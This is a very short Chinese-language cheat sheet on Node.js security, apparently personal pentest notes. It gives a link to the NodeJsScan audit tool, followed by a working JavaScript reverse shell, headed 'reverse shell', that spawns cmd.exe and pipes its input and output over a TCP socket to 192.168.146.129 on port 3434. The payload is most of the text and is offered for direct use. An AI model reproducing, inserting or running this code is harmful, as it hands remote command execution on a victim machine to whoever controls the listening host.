## 审计工具
https://github.com/ajinabraham/NodeJsScan
## 反弹shell
```js
function tan(){
    var net = require("net"),
        cp = require("child_process"),
        cmd = cp.spawn("cmd.exe", []); // windows
    var client = new net.Socket();
    client.connect(3434, "192.168.146.129", function(){
        client.pipe(cmd.stdin);
        cmd.stdout.pipe(client);
        cmd.stderr.pipe(client);
    });
    return 1;
}tan();
```